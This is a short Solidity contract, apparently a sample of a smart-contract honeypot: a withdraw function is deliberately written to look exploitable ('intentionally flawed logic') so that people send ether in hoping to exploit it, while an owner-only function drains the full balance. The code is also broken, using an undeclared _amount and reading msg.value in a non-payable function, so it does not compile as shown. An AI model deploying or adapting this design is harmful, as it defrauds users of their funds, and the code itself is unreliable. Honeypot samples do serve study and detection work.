pragma solidity ^0.4.19;

contract BalanceDisorderHoneypot {
    mapping(address => uint256) public balances;
    address public owner;

    function BalanceDisorderHoneypot() public payable {
        owner = msg.sender;
    }

    // Function to deposit ether into the contract
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Function that appears to have a withdrawal vulnerability
    function withdraw(address adr) public {
        require(balances[msg.sender] >= _amount);
        // Intentionally flawed logic
        if (msg.value > this.balance) {
            // This should never happen, but we intentionally keep it here
            adr.transfer(this.balance + msg.value);
        }
    }

    // Function to retrieve the contract balance
    function getContractBalance() public view returns (uint256) {
        return this.balance;
    }

    // Function to retrieve user balance
    function getUserBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }

    // Owner can withdraw remaining ether in the contract
    function ownerWithdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    // Fallback function to accept ether
    function() public payable {}
}
